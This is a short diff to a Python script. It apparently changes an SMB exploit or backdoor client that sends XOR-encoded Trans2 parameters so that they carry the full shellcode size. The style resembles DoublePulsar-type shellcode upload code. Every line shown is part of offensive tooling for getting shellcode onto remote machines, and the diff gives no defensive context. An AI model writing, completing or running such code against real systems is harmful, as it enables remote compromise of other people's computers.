@@ -311,9 +311,11 @@ if __name__ == "__main__":
 
         transCommand['Parameters']['ParameterCount'] = 12
         transCommand['Parameters']['ParameterOffset'] = 66
-
-        XOR_EntireSize = struct.pack('<I', 4096)
-        XOR_ChunkSize = struct.pack('<I', 4096)
+        
+        
+        
+        XOR_EntireSize = struct.pack('<I', EntireShellcodeSize)
+        XOR_ChunkSize = struct.pack('<I', EntireShellcodeSize)
         XOR_offset = struct.pack('<I', 0)
 
         XOR_EntireSize_bytearray = bytearray(XOR_EntireSize)
@@ -323,7 +325,10 @@ if __name__ == "__main__":
         byte_xor(XOR_EntireSize_bytearray, packed_xor_key)
         byte_xor(XOR_ChunkSize_bytearray, packed_xor_key)
         byte_xor(XOR_offset_bytearray, packed_xor_key)
-
+        '''
+        rather than generate the parameters all in one, we'll try to 
+        generate them one by one and attach it to the struct
+        '''
         transCommand['Parameters']['DataCount'] = XOR_EntireSize_bytearray
         transCommand['Parameters']['Chunksize'] = XOR_ChunkSize_bytearray
         transCommand['Parameters']['DataOffset'] = XOR_offset_bytearray
